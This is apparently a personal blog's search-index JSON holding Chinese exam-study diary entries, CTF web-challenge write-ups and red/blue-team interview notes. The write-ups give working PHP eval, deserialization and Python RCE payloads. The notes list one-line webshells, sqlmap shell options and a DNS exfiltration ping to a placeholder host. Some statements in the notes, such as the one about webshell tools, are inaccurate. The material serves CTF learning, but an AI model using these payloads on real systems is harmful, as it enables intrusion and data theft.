[{"title":"Hello World","url":"/2022/01/01/hello-world/","content":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.\nQuick StartCreate a new post$ hexo new &quot;My New Post&quot;\n\nMore info: Writing\nRun server$ hexo server\n\nMore info: Server\nGenerate static files$ hexo generate\n\nMore info: Generating\nDeploy to remote sites$ hexo deploy\n\nMore info: Deployment\n"},{"title":"考研日记03-26","url":"/2024/03/26/2024_3_26/","content":"2024 3 26学习时间\n4h\n\nMATH\n第二讲学完，1000题没做\n\nENGLISH\n仅限于签到，睡觉前背一点单词\n\n408\n数据结构第一章绪论看完网课（时间复杂度题未做）\n\n杂记整个三月份都没什么心思学习，情感的经历又一次使我失望，不过好在也算是结束了这一段孽缘，我也要开始找回我自己了，或许只有我自己才能拯自己。种一棵树最好的时间是十年前，其次是现在。一切都还来得及，从明天早起开始做起吧，希望能渐入佳境，完成自己的救赎。\n","categories":["考研"]},{"title":"考研日记03-27","url":"/2024/03/27/2024_3_27/","content":"2024 3 27学习时间\n5h\n\nMATH\n第三讲开了个头，第二讲1000题写完 p63\n\nENGLISH\n记了42个单词，还是太少了，以后每天目标100+\n\n408\n数据结构第一章绪论过完，第16题没怎么弄懂，明天弄一下。\n\n杂记今天总体来说状态比昨天好一些了，就是午睡时间有点长，从12.30睡到三点，以后还是要控制一下在1h以内。希望状态能越来越好。加油\n择校\n可能iie不再是我唯一的选择了，目前待定的选择，上交网安，武大网安，东南网安，南大网安。\n","categories":["考研"]},{"title":"考研日记03-28","url":"/2024/03/28/2024_3_28/","content":"2024 3 28学习时间\n3h\n\nMATH\n第三讲学完，题为做 p67\n\nENGLISH\n复习了20个单词，好懒今天\n\n408\n没复习。\n\n杂记可能是因为明天就要去吃自助了，今天没什么心思学习\n","categories":["考研"]},{"title":"考研日记03-29","url":"/2024/03/29/2024_3_29/","content":"2024 3 29学习时间\n0h\n\nMATH\n无\n\nENGLISH\n无\n\n408\n无\n\n杂记今天就当休息日吧，陪朋友去吃了自助\n","categories":["考研"]},{"title":"考研日记03-30","url":"/2024/03/30/2024_3_30/","content":"2024 3 30学习时间\n0h\n\nMATH\n无\n\nENGLISH\n无\n\n408\n无\n\n杂记今天打了一天比赛，初赛第七，感谢队友带飞！\n","categories":["考研"]},{"title":"考研日记03-31","url":"/2024/03/31/2024_3_31/","content":"2024 3 31学习时间\n6h\n\nMATH\n第四讲 讲义过完，题为做p85\n\nENGLISH\n记单词（x\n\n408\n无，确实没复习。。。\n\n杂记今天去图书馆从下午2点做到了晚上9点，感觉效率还行，算是一个比较好的开始吧，希望能坚持下去，每天都去图书馆！\n","categories":["考研"]},{"title":"考研日记04-01","url":"/2024/04/01/2024_4_1/","content":"2024 4 1学习时间\n7h\n\nMATH\n第五讲学习到了拐点附近 p96\n\nENGLISH\n晚上睡觉前一定记单词！（x\n\n408\n第二章开了个头 p17\n\n杂记今天还是去图书馆学的，学习状态还不错，就是晚上和金导为了一个事情争论了一个多小时，有点浪费时间了…，以后还是更专注一些。早上就要去图书馆！每天7:30起床！\n","categories":["考研"]},{"title":"考研日记04-02","url":"/2024/04/02/2024_4_2/","content":"2024 4 2学习时间\n0h\n\nMATH\n无\n\nENGLISH\n晚上睡觉前一定记单词！（x\n\n408\n无\n\n杂记明天一定早起学习\n","categories":["考研"]},{"title":"考研日记04-08","url":"/2024/04/08/2024_4_8/","content":"2024 4 8学习时间\n8h\n\nMATH\n第五讲完结 p108\n明天把例题重新做一遍，将1000题跟上进度，巩固基础，就先不学后面了\n\n\nENGLISH\n晚上睡觉前一定记单词！！（x\n\n408\n第二章线性表网课看完，明天把课后题写一遍 并仔细看看书\n\n杂记清明节那几天都没怎么学习，没什么状态，这几天把状态调整回来，早上一定早起来图书馆！！！\n还有就是\n记单词！\n记单词！\n记单词！\n重要的事情说三遍，这回必须要记了，不然到时候英语单科国家线没过就尴尬了！\n","categories":["考研"]},{"title":"考研日记04-09","url":"/2024/04/09/2024_4_9/","content":"2024 4 9学习时间\n8h\n\nMATH\n第五讲习题写完，1000题跟上进度，第六讲刚学到拉格朗日中值定理 P114\n\nENGLISH\n晚上睡觉前一定记单词！！（x\n\n408\n第二章线性表习题写完，第三章开头栈\n\n杂记今天明显状态好很多了，早上一起来就开始学习，但是还有个坏习惯就是每天睡的有点晚，以后争取每天12点前睡觉，每天早上七点钟起来。\n以后还是每天坚持到图书馆来学，宿舍学习终究是有点没效率\n","categories":["考研"]},{"title":"考研日记04-12","url":"/2024/04/12/2024_4_12/","content":"2024 4 12学习时间\n2h3min\n\nMATH\n第八讲过完\n\nENGLISH\n也许30个？\n\n408\n没看。。。\n\n杂记今天基本上一天都在重构博客\n将halo换成hexo的了，感觉keep主题是真的好看！\n今天看文档看的头皮发麻，勉强弄了一点\n感觉还挺好看的？😄\n\n","categories":["考研"]},{"title":"CTFSHOW_菜狗杯","url":"/2022/10/21/CTFSHOW_%E8%8F%9C%E7%8B%97%E6%9D%AF/","content":"CTFSHOW_菜狗杯web签到&lt;?phperror_reporting(0);highlight_file(__FILE__);eval($_REQUEST[$_GET[$_POST[$_COOKIE[&#x27;CTFshow-QQ群:&#x27;]]]][6][0][7][5][8][0][9][4][4]);\n\n一个看似很绕的代码，我们一层一层的看：\n$_COOKIE[‘CTFshow-QQ群:’]\n我们将cookie里的**CTFshow-QQ群:**的值设置为a，\n现在内容就是\n$_REQUEST[$_GET[$_POST[a]]]\n\n然后接着是post方式传入a&#x3D;b\n$_REQUEST[$_GET[b]]\n\n然后用get方式传入b&#x3D;c\n$_REQUEST[c][6][0][7][5][8][0][9][4][4]);\n\nREQUEST我们既可以用get方式也可以用post方式\nc[6][0][7][5][8][0][9][4][4]=system(&#x27;cat /f*&#x27;);\n\n这里要注意cookie中的**CTFshow-QQ群:**含有中文字符\n我们要将中文字符进行url解码\nCTFshow-QQ%E7%BE%A4:=a\n\n\n\n\n\n\n\nweb2 c0me_t0_s1gnF12\n\n提示说去控制台\ntry to run the function &quot;g1ve_flag()&quot; to get the flag!\n\n\n我的眼里只有$&lt;?phperror_reporting(0);extract($_POST);eval($$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$_);highlight_file(__FILE__);\n\n变量嵌套问题，先给$_赋值：$__&#x3D;a,然后给a赋值，以此类推一共有36个$，所有我们要赋值36次，写个脚本来跑一下\nimport strings = string.ascii_letters t=&#x27;_=a&amp;&#x27;code=&quot;phpinfo();&quot;for i in range(35):    t+=s[i]+&quot;=&quot;+s[i+1]+&#x27;&amp;&#x27;t+=s[i]+&#x27;=&#x27;+codeprint(t)\n\npayload\n_=a&amp;a=b&amp;b=c&amp;c=d&amp;d=e&amp;e=f&amp;f=g&amp;g=h&amp;h=i&amp;i=j&amp;j=k&amp;k=l&amp;l=m&amp;m=n&amp;n=o&amp;o=p&amp;p=q&amp;q=r&amp;r=s&amp;s=t&amp;t=u&amp;u=v&amp;v=w&amp;w=x&amp;x=y&amp;y=z&amp;z=A&amp;A=B&amp;B=C&amp;C=D&amp;D=E&amp;E=F&amp;F=G&amp;G=H&amp;H=I&amp;I=J&amp;I=system(&#x27;cat /f*&#x27;);\n\n\n\n\n\n\n\n一言既出 &lt;?phphighlight_file(__FILE__); include &quot;flag.php&quot;;  if (isset($_GET[&#x27;num&#x27;]))&#123;    if ($_GET[&#x27;num&#x27;] == 114514)&#123;        assert(&quot;intval($_GET[num])==1919810&quot;) or die(&quot;一言既出，驷马难追!&quot;);        echo $flag;    &#125; &#125; \n\n\nassert里面如果是字符串的话，会将字符串当作php代码执行，与eval不同的一点是，结尾不需要分号\n\npayload\n?num=114514);//      将前面闭合并且注释掉后面的部分（妙啊）?num=114514%2b1805296     %2b为加号url编码，两个相加等于1919810?num=114514);1919810    跟第一种方法类似\n\n\n\n\n\n\n\n驷马难追&lt;?phphighlight_file(__FILE__); include &quot;flag.php&quot;;  if (isset($_GET[&#x27;num&#x27;]))&#123;     if ($_GET[&#x27;num&#x27;] == 114514 &amp;&amp; check($_GET[&#x27;num&#x27;]))&#123;              assert(&quot;intval($_GET[num])==1919810&quot;) or die(&quot;一言既出，驷马难追!&quot;);              echo $flag;     &#125; &#125; function check($str)&#123;  return !preg_match(&quot;/[a-z]|\\;|\\(|\\)/&quot;,$str);\n\n相较于上一个题，过滤了字母，分号，括号，仍然可以用%2b绕过\npayload\n?num=114514%2b1805296\n\n\n\n\n\n\n\nTapTapTapF12控制台求值，flag在\n/secret_path_you_do_not_know/secretfile.txt\n\n\n\n\n\n\n\nwebshell &lt;?php     error_reporting(0);    class Webshell &#123;        public $cmd = &#x27;echo &quot;Hello World!&quot;&#x27;;        public function __construct() &#123;            $this-&gt;init();        &#125;        public function init() &#123;            if (!preg_match(&#x27;/flag/i&#x27;, $this-&gt;cmd)) &#123;                $this-&gt;exec($this-&gt;cmd);            &#125;        &#125;        public function exec($cmd) &#123;            $result = shell_exec($cmd);            echo $result;        &#125;    &#125;    if(isset($_GET[&#x27;cmd&#x27;])) &#123;        $serializecmd = $_GET[&#x27;cmd&#x27;];        $unserializecmd = unserialize($serializecmd);        $unserializecmd-&gt;init();    &#125;    else &#123;        highlight_file(__FILE__);    &#125;?&gt; \n\n一到简单的反序列化题目\n目标点在webshell类上的init函数，反序列化后直接执行。。。\nexp\n &lt;?php  class Webshell &#123;         public $cmd = &#x27;cat f*&#x27;;        &#125;  echo serialize(new Webshell);?&gt; // O:8:&quot;Webshell&quot;:1:&#123;s:3:&quot;cmd&quot;;s:6:&quot;cat f*&quot;;&#125; \n\n\n\n\n\n\n\n化零为整 &lt;?phphighlight_file(__FILE__);include &quot;flag.php&quot;;$result=&#x27;&#x27;;for ($i=1;$i&lt;=count($_GET);$i++)&#123;    if (strlen($_GET[$i])&gt;1)&#123;        die(&quot;你太长了！！&quot;);        &#125;    else&#123;    $result=$result.$_GET[$i];    &#125;&#125;if ($result ===&quot;大牛&quot;)&#123;    echo $flag;&#125;\n\n中文在php里面长度是3，其实很容易想到中文的url编码就是3个\n我们将大牛进行url编码\n%E5%A4%A7%E7%89%9B\n\n\n\npayload\n/?1=%E5&amp;2=%A4&amp;3=%A7&amp;4=%E7&amp;5=%89&amp;6=%9B\n\n\n\n\n\n\n\n无一幸免 &lt;?phpinclude &quot;flag.php&quot;;highlight_file(__FILE__);if (isset($_GET[&#x27;0&#x27;]))&#123;    $arr[$_GET[&#x27;0&#x27;]]=1;    if ($arr[]=1)&#123;        die($flag);    &#125;    else&#123;        die(&quot;nonono!&quot;);    &#125;&#125;\n\n代码部分7，8行条件判断，这里$arr[]&#x3D;1是个赋值操作，也就是说代码走到这里if条件始终为ture，可以die出flag，那么给0可随便赋值。空值也无所谓。\npayload\n?0=0\n\n\n\n\n\n\n\n传说之下（雾）var nowScore = this.score += 1\n\njs代码中第275行，将这个改为\nvar nowScore = this.score += 2077\n\n\n\n\n\n算力超群抓个包先\nGET /_calculate?number1=5&amp;operator=*&amp;number2=6 HTTP/1.1\n\n传递了3个参数，我们分别对这个三个参数污染一下\n发现number1,operator都有过滤，对number2时直接报错了\n直接对number2 RCE\npayload\n/_calculate?number1=5&amp;operator=*&amp;number2=__import__(&#x27;os&#x27;).popen(&#x27;cat /f*&#x27;).read()\n\n\n\n\n\n\n\n遍地飘零 &lt;?phpinclude &quot;flag.php&quot;;highlight_file(__FILE__);$zeros=&quot;000000000000000000000000000000&quot;;foreach($_GET as $key =&gt; $value)&#123;    $$key=$$value;&#125;if ($flag==&quot;000000000000000000000000000000&quot;)&#123;    echo &quot;好多零&quot;;&#125;else&#123;    echo &quot;没有零，仔细看看输入有什么问题吧&quot;;    var_dump($_GET);&#125;\n\n本题考察的是变量覆盖\n我们传入?_GET&#x3D;flag\nvar_dump($_GET);=&gt;  var_dump($flag);\n\n\n\n\n\n茶歇区抓包\n没怎么搞懂，看wp说是php整数溢出，\npayload\na=0&amp;b=0&amp;c=0&amp;d=0&amp;e=999999999999999999&amp;submit=%E5%8D%B7%E4%BA%86%E5%B0%B1%E8%B7%91%EF%BC%81\n\n\n\n\n\n\n\n小舔田 &lt;?phpinclude &quot;flag.php&quot;;highlight_file(__FILE__);class Moon&#123;    public $name=&quot;月亮&quot;;    public function __toString()&#123;        return $this-&gt;name;    &#125;        public function __wakeup()&#123;        echo &quot;我是&quot;.$this-&gt;name.&quot;快来赏我&quot;;    &#125;&#125;class Ion_Fan_Princess&#123;    public $nickname=&quot;牛夫人&quot;;    public function call()&#123;        global $flag;        if ($this-&gt;nickname==&quot;小甜甜&quot;)&#123;            echo $flag;        &#125;else&#123;            echo &quot;以前陪我看月亮的时候，叫人家小甜甜！现在新人胜旧人，叫人家&quot;.$this-&gt;nickname.&quot;。\\n&quot;;            echo &quot;你以为我这么辛苦来这里真的是为了这条臭牛吗?是为了你这个没良心的臭猴子啊!\\n&quot;;        &#125;    &#125;        public function __toString()&#123;        $this-&gt;call();        return &quot;\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t----&quot;.$this-&gt;nickname;    &#125;&#125;if (isset($_GET[&#x27;code&#x27;]))&#123;    unserialize($_GET[&#x27;code&#x27;]);&#125;else&#123;    $a=new Ion_Fan_Princess();    echo $a;&#125;\n\n在Ion_Fan_Princess类下的 call函数可以 echo $flag\nIon_Fan_Princess类的__toString可以出发call函数\nMoon类 下的 __wakeup可以触发 ____toString\npop链\nMoon::__wakeup =&gt; Ion_Fan_Princess::__toString =&gt; Ion_Fan_Princess::call\n\n\n\nexp\n &lt;?phpclass Moon&#123;    public $name;&#125;class Ion_Fan_Princess&#123;    public $nickname=&quot;小甜甜&quot;;    &#125;$a=new Moon;$b=new Ion_Fan_Princess;$a-&gt;name=$b;echo serialize($a);//  &lt;?phpclass Moon&#123;    public $name;    &#125;class Ion_Fan_Princess&#123;    public $nickname=&quot;小甜甜&quot;;    &#125;$a=new Moon;$b=new Ion_Fan_Princess;$a-&gt;name=$b;echo serialize($a);// O:4:&quot;Moon&quot;:1:&#123;s:4:&quot;name&quot;;O:16:&quot;Ion_Fan_Princess&quot;:1:&#123;s:8:&quot;nickname&quot;;s:9:&quot;小甜甜&quot;;&#125;&#125;\n\n\n\npayload\n?code=O:4:&quot;Moon&quot;:1:&#123;s:4:&quot;name&quot;;O:16:&quot;Ion_Fan_Princess&quot;:1:&#123;s:8:&quot;nickname&quot;;s:9:&quot;小甜甜&quot;;&#125;&#125;","categories":["复现"]},{"title":"DASCTF X GFCTF 2022十月挑战赛","url":"/2022/11/02/DASCTF%20X%20GFCTF%202022%E5%8D%81%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B%EF%BC%81/","content":"DASCTF X GFCTF 2022十月挑战赛！WEB1.EasyPOP源码：\n &lt;?phphighlight_file(__FILE__);error_reporting(0);class fine&#123;    private $cmd;    private $content;    public function __construct($cmd, $content)    &#123;        $this-&gt;cmd = $cmd;        $this-&gt;content = $content;    &#125;    public function __invoke()    &#123;        call_user_func($this-&gt;cmd, $this-&gt;content);    &#125;    public function __wakeup()    &#123;        $this-&gt;cmd = &quot;&quot;;        die(&quot;Go listen to Jay Chou&#x27;s secret-code! Really nice&quot;);    &#125;&#125;class show&#123;    public $ctf;    public $time = &quot;Two and a half years&quot;;    public function __construct($ctf)    &#123;        $this-&gt;ctf = $ctf;    &#125;    public function __toString()    &#123;        return $this-&gt;ctf-&gt;show();    &#125;    public function show(): string    &#123;        return $this-&gt;ctf . &quot;: Duration of practice: &quot; . $this-&gt;time;    &#125;&#125;class sorry&#123;    private $name;    private $password;    public $hint = &quot;hint is depend on you&quot;;    public $key;    public function __construct($name, $password)    &#123;        $this-&gt;name = $name;        $this-&gt;password = $password;    &#125;    public function __sleep()    &#123;        $this-&gt;hint = new secret_code();    &#125;    public function __get($name)    &#123;        $name = $this-&gt;key;        $name();    &#125;    public function __destruct()    &#123;        if ($this-&gt;password == $this-&gt;name) &#123;            echo $this-&gt;hint;        &#125; else if ($this-&gt;name = &quot;jay&quot;) &#123;            secret_code::secret();        &#125; else &#123;            echo &quot;This is our code&quot;;        &#125;    &#125;    public function getPassword()    &#123;        return $this-&gt;password;    &#125;    public function setPassword($password): void    &#123;        $this-&gt;password = $password;    &#125;&#125;class secret_code&#123;    protected $code;    public static function secret()    &#123;        include_once &quot;hint.php&quot;;        hint();    &#125;    public function __call($name, $arguments)    &#123;        $num = $name;        $this-&gt;$num();    &#125;    private function show()    &#123;        return $this-&gt;code-&gt;secret;    &#125;&#125;if (isset($_GET[&#x27;pop&#x27;])) &#123;    $a = unserialize($_GET[&#x27;pop&#x27;]);    $a-&gt;setPassword(md5(mt_rand()));&#125; else &#123;    $a = new show(&quot;Ctfer&quot;);    echo $a-&gt;show();&#125;Ctfer: Duration of practice: Two and a half years\n\n最终利用点是fine::invoke\n$a = unserialize($_GET[&#39;pop&#39;]);这里告诉我们是反序列化的题目，构造pop链\nfine::__invoke() &lt;- sorry::__get() &lt;- secret_code::show() &lt;- secret_code::__call() &lt;- show::__toString() &lt;- sorry::__destruct() \n\n\n\n\n\npoc\n&lt;?phpclass fine&#123;    public $cmd;    public $content;&#125;class secret_code&#123;    public $code;&#125;class show&#123;    public $ctf;    public $time;&#125;class sorry&#123;    public $name;    public $password;    public $hint;    public $key;&#125;$sorry = new sorry();$sorry2 = new sorry();$show = new show();$secret_code = new secret_code();$fine = new fine();$sorry-&gt;hint = $show;$show-&gt;ctf = $secret_code;$secret_code-&gt;code = $sorry2;$sorry2-&gt;key = $fine;$fine-&gt;cmd = &#x27;system&#x27;;$fine-&gt;content = &#x27;cat /flag&#x27;;echo serialize($sorry);?&gt;//绕过wakeup//?pop=O:5:&quot;sorry&quot;:4:&#123;s:4:&quot;name&quot;;N;s:8:&quot;password&quot;;N;s:4:&quot;hint&quot;;O:4:&quot;show&quot;:2:&#123;s:3:&quot;ctf&quot;;O:11:&quot;secret_code&quot;:1:&#123;s:4:&quot;code&quot;;O:5:&quot;sorry&quot;:4:&#123;s:4:&quot;name&quot;;N;s:8:&quot;password&quot;;N;s:4:&quot;hint&quot;;N;s:3:&quot;key&quot;;O:4:&quot;fine&quot;:3:&#123;s:3:&quot;cmd&quot;;s:6:&quot;system&quot;;s:7:&quot;content&quot;;s:9:&quot;cat /flag&quot;;&#125;&#125;&#125;s:4:&quot;time&quot;;N;&#125;s:3:&quot;key&quot;;N;&#125;","categories":["复现"]},{"title":"HW prepare","url":"/2023/04/12/HW%20prepare/","content":"HW prepare对hw的理解我个人觉得护网行动是国家重视网络安全的一种体现，目的是发现企业政府安全问题并解决，提供安全能力\nhw分为蓝队防守方和红队攻击方\nhw防守人员组成监控组：监控组主要就是对WAF、IPS等安全设备进行7*24小时监控、派发、跟踪、反馈安全威胁\n研判组：研判组主要是技术支撑，对于监控组发现的攻击行为进行技术研判\n网络处置组：网络处置组主要职责就是发现攻击时在防火墙上对攻击方进行IP封锁，溯源等等\n应用处置组：应用处置组主要就是对发现的攻击和漏洞进行风险处置、安全加固\n安全产品了解哪些\n防火墙一般不属于区域的边界，如数据中心中核心区域和业务区域的边界防火墙、园区网络边界防火墙等，主要做保证边界安全\n抗D也叫抗DDOS设备即流量清洗设备，一般部署与网络最外侧，防止大规模僵尸网络入侵，内部有一套完整的机制可以区分哪些流量是用户正常流量和僵尸网络流量，可以保障数据中心可以提供完整的数据中心服务；\n负载均衡设备分为全局负载均衡（GLB）和链路负载均衡（LLB）以及服务器负载均衡（SLB）。GLB可以保障用户可以访问就近的数据中心提供的服务资源，LLB可以保障流量的出栈负载均衡和入栈负载均衡。SLB可以保障服务器对外服务的时候负载更平均、可靠；\nWAF即web应用防火墙，可以防止网站挂马保障网页安全，部署在WEB服务器区域；\n数据库审计设备是把对数据库所有的操作记录下来，方便后期溯源审计和责任明确，部署在运维管理区域或者数据库审计区域均可。\n漏扫即漏洞扫描就是给系统做体检，可以扫描出操作系统漏洞、数据库漏洞、WEB漏洞，方便管理员对暴露出的漏洞情况进行安全加固。一般部署在安全检测区域。\n网页防篡改一般和WAF配合使用，保护web网页不被黑客篡改，如果被篡改了，那结果仍然可以显示篡改前的正常页面，在政府行业用的最多。一般是软件直接安装在WEB服务器上。\n上网行为管理设备说白了是可以记录员工的上网行为，包括浏览网页的地址、检索内容、聊天记录等，一般旁挂于核心交换机。\n堡垒机即运维审计设备，所有涉及到登录设备（如服务器、存储、交换机、防火墙等ICT产品）的操作都要先登录到堡垒机统一登录入口。同时所有的操作都会被审计下来，方便后期溯源取证。\n\npdf解析有没有可能存在xxe是的，PDF 解析器可能存在 XXE（XML 外部实体注入）漏洞。这是因为 PDF 格式支持内嵌 XML 数据，并且一些 PDF 解析器可能会对这些数据进行处理，其中可能包含 XML 实体。\nhttp协议里面method和data方法\t描述\t是否包含主体GET\t从服务器获取一份文档\t否HEAD\t只从服务器获取文档的首部\t否POST\t向服务器发送带要处理的数据\t是PUT\t将请求的主体部分存储在服务器上\t是TRACE\t对可能经过代理服务器传送到服务器上去的报文进行追踪\t否OPTIONS\t决定可以在胀务器上执行哪些方法\t否DELETE\t从服务器上删除一份文档\t否\n威胁情报告警如何判断网络攻击类的告警要怎么判断sql注入的修复方式\nSQL语句预编译\n针对SQL输入内容进行限制、过滤 &#x2F;&#x2F;目前使用WAF对这一块进行处理\n针对提交的关键数据进行转义 ，比如\\select\n关闭错误信息输出 ，因为有些错误返回信息，会返回物理路径、数据库版本信息等\n数据库权限严格控制 ，不同级别的用户，只能进行相应级别权限的操作\n敏感信息严格加密处理\n\n网络攻击的方向来自哪三个方向如何判断攻击是不是误报DNS外带存在哪些漏洞\nsql盲注\n\nXSS\n\n命令执行\n\nwindows可以查询主机用户名等\nping %USERNAME%.XXX.CEYE.IO\n\nxxe\n\nssrf\n\n\n什么是攻防演练网络安全实战攻防演练是以获取指定目标系统（标靶系统）的管理权限为目标的攻防演练，由攻防领域经验丰富的红队专家组成攻击队，在保障业务系统稳定运行的前提下，采用“不限攻击路径，不限制攻击手段”的贴合实战方式，而形成的“有组织”的网络攻击行动。攻防演练通常是在真实网络环境下对参演单位目标系统进行全程可控、可审计的实战攻击，拟通过演练检验参演单位的安全防护和应急处置能力，提高网络安全的综合防控能力。\n怎么判断socket代理\n通过 Websocket 的 bufferedAmount 来探测用户是否采用来代理\n\nClient 通过 Websocket 与 Server 建立连接\nServer 监听到 connect 事件后，将本次 TCP 的 window size 设置为 0，这也就意味着 Client 无法继续将数据包传给 server\nClient 使用 websocket.send()持续发送几个包\n在 Client 上观察 websocket.bufferedAmount 值，如果过了一会，这个值一直在增大，说明无代理，否则存在代理为啥可以通过这个值来判断呢？这是因为代理工具一般不会转发 TCP 的设置，也就是说，开启了代理的 Client 发出的包会被代理给吃掉\n\n\n一句话木马&lt;?php @eval($_POST[1]);?&gt;    php&lt;%eval request(&quot;chopper&quot;)%&gt;   asp &lt;%Process process = Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;));%&gt;  jsp\n\n\n\n社工手段有哪些\n邮件钓鱼 \n伪装成熟人\n\nfastjson客服有映射到外网的服务器被打进来了，如何溯源常见的中间件漏洞IIS\n\n解析漏洞\nput任意文件写入\n段文件漏洞\n\napache\n\n未知扩展名解析漏洞\naddhandler导致的解析漏洞\n换行解析漏洞\n\nnginx\n\n解析漏洞\n空字节任意代码执行\n文件名逻辑漏洞‘\n配置错误导致的安全问题\n\ntomcat\n\n任意文件写入\n远程代码执行\n弱口令+后台getshell\n\njboss\n\n反序列化漏洞\n弱口令\n\nngsoc冷热数据奇安信网神态势感知与安全运营平台（简称NGSOC）\n代理工具类告警，流量特征你感觉windows漏洞多还是linux漏洞多个人觉得linux漏洞多，debian linux漏洞最多\n永恒之蓝2017年\n用Windows系统的SMB协议漏洞来获取系统的最高权限 139，445端口\nsql注入写文件load_file()读文件 into outfile &#x2F; into dumpfile写文件\n正向代理反向代理正向代理代理的对象是客户端，反向代理代理的对象是服务端。\n延时注入在流量告警上如何判断的宽字节一个字符数大小为两个字节的为宽字节，比如GBK编码，我们汉字通常使用的就是GBK编码，也就是说一次性会读取两个字节。\n当我们的mysql使用GBK编码后，同时两个字符的前一个字符ASCII码大于128时，会将两个字符认成一个汉字\n流量代理工具有哪些vpn，Shadowsocks，Trojan，WireGuard\n冰蝎与哥斯拉的连接特征冰蝎和哥斯拉都是利用远程管理工具（如Apache Struts漏洞）进行攻击，然后利用远程桌面协议（RDP）或SSH进行横向移动。\n都能够进行远程控制\n都可以进行数据窃取\n使用加密通信\n怎么判断逻辑漏洞是否攻击成功\n行为变化：逻辑漏洞攻击成功后，攻击者可能会进行一些行为变化，比如访问一些不应该被访问的资源，或者执行一些不应该被执行的操作。\n数据变化：逻辑漏洞攻击成功后，攻击者可能会修改、删除或者新增某些数据。\n系统响应：逻辑漏洞攻击成功后，系统可能会出现异常响应，比如返回异常的HTTP状态码或者错误信息。\n安全日志：逻辑漏洞攻击成功后，可能会在系统的安全日志中留下痕迹，比如异常访问记录、错误日志等。\n\nsql注入修复方式\nSQL语句预编译\n针对SQL输入内容进行限制、过滤 &#x2F;&#x2F;目前使用WAF对这一块进行处理\n针对提交的关键数据进行转义 ，比如\\select\n关闭错误信息输出 ，因为有些错误返回信息，会返回物理路径、数据库版本信息等\n数据库权限严格控制 ，不同级别的用户，只能进行相应级别权限的操作\n敏感信息严格加密处理\n\n天眼与ngsoc区别NGSOC主要应用于较为复杂、高风险的网络环境，如金融机构、能源公司等，其主要优点是可以集成多种不同的安全监测工具，实现信息的智能化分析和响应；而天眼则更加注重对企业内部网络资产的保护，具备网络漏洞检测和入侵攻击检测等多种功能。\n文件上传漏洞如何防御\n检查文件上传路径 ( 避免 0x00 截断、 IIS6.0 文件夹解析漏洞、目录遍历 )\n\n文件扩展名检测 ( 避免服务器以非图片的文件格式解析文件 ),验证文件扩展名 通常有两种方式 : 黑名单和白名单 .\n\n文件 MIME验证 ( 比如 GIF 图片 MIME为 image&#x2F;gif,CSS 文件的 MIME为 text&#x2F;css 等 ) 3. 文件内容检测 ( 避免图片中插入 webshell)\n\n图片二次渲染 ( 最变态的上传漏洞防御方式 , 基本上完全避免了文件上传漏洞 )\n\n文件重命名 ( 如随机字符串或时间戳等方式 , 防止攻击者得到 webshell 的路径 )\n\n隐藏上传路径\n\n\nxffx-forwarded-for 表了HTTP的请求端真实的IP\n可以进行sql注入\nsql注入写文件前提\n对web目录具有读写权限\n知道文件绝对路径\n能够使用联合查询（sql注入时）\nsecure_file_priv，File_priv\n\nsqlmap一些参数-h                  输出参数说明-hh                 输出详细的参数说明-v                  输出级别（0~6，默认1）-u url              指定url--data=DATA         该参数指定的数据会被作为POST数据提交-r file.txt         常用于POST注入或表单提交时注入-p / --skip         指定/跳过测试参数--cookie            设置cookie--force-ssl         强制使用SSL--threads           指定线程并发数--prefix            指定前缀--suffix            指定后缀--level             检测级别（1~5，默认1）--risk              风险等级（1~4，默认1）--all               列举所有可访问的数据（不推荐）--banner            列举数据库系统的信息等--current-user      输出当前用户--current-db        输出当前所在数据库--hostname          输出服务器主机名--is-dba            检测当前用户是否为管理员--users             输出数据库系统的所有用户--dbs               输出数据库系统的所有数据库-D DB               指定数据库--tables            在-D情况下输出库中所有表名-T table            在-D情况下指定数据表--columns           在-D -T情况下输出表中所有列名-C column           在-D -T情况下输出某列数据的值--dump              拉取数据存放到本地--dump-all          拉取所有可访问数据存放到本地--count             输出数据条目数量--search            搜索数据库名、表明、列名，需要与-D -T或-C 联用--sql-query         执行任意的SQL语句--sql-shell         使用交互式SQL语句执行环境--flie-read         读取文件--file-write        上传文件（指定本地路径）--file-dest         上传文件（指定目标机器路径）--os-cmd            执行任意系统命令--os-shell          使用交互式shell执行命令--batch             所有要求输入都选取默认值--wizard            初学者向导\n\n\n\n\n\ncsrf攻击者可以盗用你的登陆信息，以你的身份模拟发送各种请求对服务器来说这个请求是完全合法的，但是却完成了攻击者所期望的一个操作\nCSRF 攻击的三个条件 :\n   1 . 用户已经登录了站点 A，并在本地记录了 cookie\n\n   2 . 在用户没有登出站点 A 的情况下（也就是 cookie 生效的情况下），访问了恶意攻击者提供的引诱危险站点 B (B 站点要求访问站点A)。\n\n   3 . 站点 A 没有做任何 CSRF 防御\n\n漏洞检测\n检测CSRF漏洞最简单的方法就是抓取一个正常请求的数据包，去掉Referer字段后再重新提交，如果该提交还有效，那么基本上可以确定存在CSRF漏洞。\n防御\n\n验证 HTTP Referer 字段；\n在请求地址中添加 token 并验证；\n在 HTTP 头中自定义属性并验证；\nChrome 浏览器端启用 SameSite cookie\n\nssrf服务端请求伪造(Server-Side Request Forgery),指的是攻击者在未能取得服务器所有权限时，利用服务器漏洞以服务器的身份发送一条构造好的请求给服务器所在内网。SSRF攻击通常针对外部网络无法直接访问的内部系统。\n防御\n1、过滤返回的信息，如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。\n2、统一错误信息，避免用户可以根据错误信息来判断远程服务器的端口状态。\n3、限制请求的端口，比如80,443,8080,8090。\n4、禁止不常用的协议，仅仅允许http和https请求。可以防止类似于file:&#x2F;&#x2F;&#x2F;,gopher:&#x2F;&#x2F;,ftp:&#x2F;&#x2F;等引起的问题。\n5、使用DNS缓存或者Host白名单的方式。\n水坑漏洞水坑攻击（Watering Hole Attack）”是一种网络攻击方式。攻击者通过在特定网页中植入恶意代码，来攻击访问该网页的用户\n防御\n（1）    及时更新操作系统及应用程序，修复已知漏洞；\n（2）    安装可以信赖的安全软件，及时发现网页浏览过程中的异常行为；\n（3）    